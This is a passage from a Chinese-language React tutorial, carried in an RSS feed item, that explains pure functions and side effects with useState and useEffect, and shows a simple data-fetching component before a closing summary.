  <span class="hljs-keyword">return</span> nums.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a + b, <span class="hljs-number">0</span>);
}
</code></pre>
<p>调用后，原始 <code>nums</code> 数组被改变，后续代码行为不可预测。而在 React 中，<code>useEffect</code> 正是将这类“不纯”的操作集中管理的容器，使主渲染逻辑保持纯净，提升可测试性与可维护性。</p>
<h2 data-id="heading-4">实际应用：数据获取与条件渲染</h2>
<p>结合 <code>useState</code> 与 <code>useEffect</code>，可实现典型的数据驱动 UI：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [data, setData] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">null</span>);

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/data'</span>)
      .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-title function_">json</span>())
      .<span class="hljs-title function_">then</span>(setData);
  }, []);

  <span class="hljs-keyword">return</span> data ? <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>{data}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span> : <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>加载中...<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span>;
}
</code></pre>
<p>这里，数据请求作为副作用在挂载后执行，成功后通过 <code>setData</code> 触发重新渲染，展示最新内容。整个流程清晰、线性，无需关心生命周期钩子的切换。</p>
<h2 data-id="heading-5">总结</h2>
<p>React Hooks 通过 <code>useState</code> 和 <code>useEffect</code> 等核心 API，将状态管理和副作用处理从类组件的生命周期中解放出来，赋予函数组件完整的逻辑表达能力。它们以声明式的方式描述“何时做什么”，而非“在哪个阶段做什么”，更符合直觉。同时，依赖数组机制强制开发者显式声明副作用的触发条件，提升了代码的可读性与健壮性。掌握 Hooks，不仅是使用现代 React 的必备技能，更是迈向函数式、响应式前端开发思维的关键一步。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>